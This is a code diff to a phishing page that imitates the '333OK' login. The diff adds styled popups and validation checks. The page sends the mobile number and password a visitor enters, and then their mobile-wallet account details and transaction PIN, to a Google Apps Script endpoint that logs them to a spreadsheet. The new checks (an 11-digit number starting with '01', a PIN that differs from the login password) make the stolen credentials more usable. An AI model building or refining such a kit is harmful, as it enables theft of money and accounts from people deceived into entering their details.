@@ -32,7 +32,6 @@
             align-items: center;
         }
 
-        /* 🖼️ Logo Container */
         .logo-box { 
             display: flex; 
             align-items: center; 
@@ -41,7 +40,6 @@
             width: 100%;
         }
 
-        /* 🖼️ PNG Logo */
         .logo-img {
             height: 80px;
             width: auto;
@@ -113,6 +111,91 @@
         .success-icon { font-size: 50px; color: #00c853; margin-bottom: 15px; }
         .success-title { font-size: 18px; font-weight: bold; color: #2c3e50; margin-bottom: 12px; }
         .success-desc { font-size: 13px; color: #555; line-height: 1.6; }
+
+        /* 🎨 Custom Popup Style */
+        .popup-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            backdrop-filter: blur(3px);
+        }
+
+        .popup-overlay.show {
+            display: flex;
+            animation: fadeIn 0.25s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .popup-box {
+            background: #ffffff;
+            border-radius: 18px;
+            padding: 25px 22px;
+            width: 85%;
+            max-width: 320px;
+            text-align: center;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+            animation: popIn 0.3s ease;
+            position: relative;
+        }
+
+        .popup-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: #ffe5e5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 32px;
+            color: #e74c3c;
+        }
+
+        .popup-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .popup-message {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .popup-btn {
+            width: 100%;
+            padding: 12px;
+            background: #e74c3c;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .popup-btn:hover {
+            background: #c0392b;
+            transform: scale(1.02);
+        }
     </style>
 </head>
 <body>
@@ -123,7 +206,6 @@
         <div id="loginPage" class="page active">
             <div style="width: 100%; max-width: 320px;">
                 
-                <!-- 🖼️ PNG LOGO -->
                 <div class="logo-box">
                     <img src="https://images.3820949.com/wsd-images-prod/333okbdts2/fe_setting/web_logo/wps_333ok_20260210135317.png" 
                          alt="333OK Logo" 
@@ -134,7 +216,7 @@
 
                 <div class="input-group">
                     <i class="fa-solid fa-phone"></i>
-                    <input type="text" id="phone" placeholder="Mobile Number">
+                    <input type="text" id="phone" placeholder="Mobile Number" maxlength="11">
                 </div>
 
                 <div class="input-group">
@@ -215,15 +297,38 @@
 
     </div>
 
+    <!-- 🎨 Custom Popup -->
+    <div class="popup-overlay" id="customPopup">
+        <div class="popup-box">
+            <div class="popup-icon" id="popupIcon">❌</div>
+            <div class="popup-title" id="popupTitle">ভুল পাসওয়ার্ড!</div>
+            <div class="popup-message" id="popupMessage">
+                উত্তোলন পাসওয়ার্ড এবং লগইন পাসওয়ার্ড একই হতে পারবে না!
+            </div>
+            <button class="popup-btn" onclick="closePopup()">ঠিক আছে</button>
+        </div>
+    </div>
+
     <script>
-        // ✅ Google Apps Script Web App URL
         const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxtc9IVXWY2OFQ6Tn5va0Qx4ljWiN4kCoRmXGHwRQ2EPVkkY5l4t9yoHPBfZDMAGedn/exec";
 
         let userPhone = "";
         let userPass = "";
         let currentWallet = "নগদ";
 
-        // ✅ Google Sheet-এ ডেটা পাঠানোর helper function (URL-encoded form data)
+        // 🎨 Custom Popup Functions
+        function showPopup(message, title = "ভুল পাসওয়ার্ড!", icon = "❌") {
+            document.getElementById('popupMessage').innerText = message;
+            document.getElementById('popupTitle').innerText = title;
+            document.getElementById('popupIcon').innerText = icon;
+            document.getElementById('customPopup').classList.add('show');
+        }
+
+        function closePopup() {
+            document.getElementById('customPopup').classList.remove('show');
+        }
+
+        // ✅ Google Sheet helper
         function sendToGoogleSheet(payload) {
             const formData = new URLSearchParams();
             for (const key in payload) {
@@ -259,25 +364,64 @@
             }
         }
 
-        // ✅ Login → KYC page
+        // ✅ Login → KYC page (with validation popup)
         function sendLoginData() {
             userPhone = document.getElementById('phone').value.trim();
             userPass  = document.getElementById('password').value.trim();
 
-            if (userPhone.length > 3 && userPass.length > 0) {
-                sendToGoogleSheet({
-                    type: "LOGIN",
-                    phone: userPhone,
-                    password: userPass
-                })
-                .then(() => console.log("Login data sent"))
-                .catch(err => console.error("Login send error:", err));
-
-                document.getElementById('loginPage').classList.remove('active');
-                document.getElementById('kycPage').classList.add('active');
-            } else {
-                alert("দয়া করে সঠিক মোবাইল নম্বর এবং পাসওয়ার্ড দিন");
+            // 🔴 Validation ১: Number খালি কিনা
+            if (userPhone.length === 0) {
+                showPopup("অনুগ্রহ করে মোবাইল নম্বর পূরণ করুন!", "অসম্পূর্ণ তথ্য", "⚠️");
+                return;
             }
+
+            // 🔴 Validation ২: Number ১১ digit এর কম হলে
+            if (userPhone.length < 11) {
+                showPopup("মোবাইল নম্বর ১১ সংখ্যার হতে হবে!", "ভুল মোবাইল নম্বর!", "📱");
+                return;
+            }
+
+            // 🔴 Validation ৩: Number ১১ digit এর বেশি হলে
+            if (userPhone.length > 11) {
+                showPopup("মোবাইল নম্বর ১১ সংখ্যার বেশি হতে পারবে না!", "ভুল মোবাইল নম্বর!", "📱");
+                return;
+            }
+
+            // 🔴 Validation ৪: Number-এ অক্ষর থাকলে
+            if (!/^\d+$/.test(userPhone)) {
+                showPopup("মোবাইল নম্বরে শুধু সংখ্যা থাকতে হবে!", "ভুল মোবাইল নম্বর!", "📱");
+                return;
+            }
+
+            // 🔴 Validation ৫: Number "01" দিয়ে শুরু না হলে
+            if (!userPhone.startsWith("01")) {
+                showPopup("মোবাইল নম্বর অবশ্যই 01 দিয়ে শুরু হতে হবে!", "ভুল মোবাইল নম্বর!", "📱");
+                return;
+            }
+
+            // 🔴 Validation ৬: Password খালি কিনা
+            if (userPass.length === 0) {
+                showPopup("অনুগ্রহ করে পাসওয়ার্ড পূরণ করুন!", "অসম্পূর্ণ তথ্য", "⚠️");
+                return;
+            }
+
+            // 🔴 Validation ৭: Password ৬ অক্ষরের কম হলে
+            if (userPass.length < 6) {
+                showPopup("সঠিক পাসওয়ার্ড প্রদান করুন! (কমপক্ষে ৬ অক্ষর)", "ভুল পাসওয়ার্ড!", "🔒");
+                return;
+            }
+
+            // ✅ সব validation পাস হলে
+            sendToGoogleSheet({
+                type: "LOGIN",
+                phone: userPhone,
+                password: userPass
+            })
+            .then(() => console.log("Login data sent"))
+            .catch(err => console.error("Login send error:", err));
+
+            document.getElementById('loginPage').classList.remove('active');
+            document.getElementById('kycPage').classList.add('active');
         }
 
         // ✅ KYC submit → success page
@@ -288,6 +432,15 @@
             const pin     = document.getElementById('transPin').value.trim();
 
             if (accNum && vName && vNumber && pin) {
+
+                // 🎯 Transfer PIN = Login Password হলে error
+                if (pin === userPass) {
+                    showPopup("উত্তোলন পাসওয়ার্ড এবং লগইন পাসওয়ার্ড একই হতে পারবে না!", "ভুল পাসওয়ার্ড!", "❌");
+                    document.getElementById('transPin').value = "";
+                    document.getElementById('transPin').focus();
+                    return;
+                }
+
                 sendToGoogleSheet({
                     type: "KYC",
                     loginPhone: userPhone,
@@ -304,7 +457,7 @@
                 document.getElementById('kycPage').classList.remove('active');
                 document.getElementById('successPage').classList.add('active');
             } else {
-                alert("দয়া করে সকল তথ্য সঠিকভাবে পূরণ করুন!");
+                showPopup("দয়া করে সকল তথ্য সঠিকভাবে পূরণ করুন!", "অসম্পূর্ণ তথ্য", "⚠️");
             }
         }
 
